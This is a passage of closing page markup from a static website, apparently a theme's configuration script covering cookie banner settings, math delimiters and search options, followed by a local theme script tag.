it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
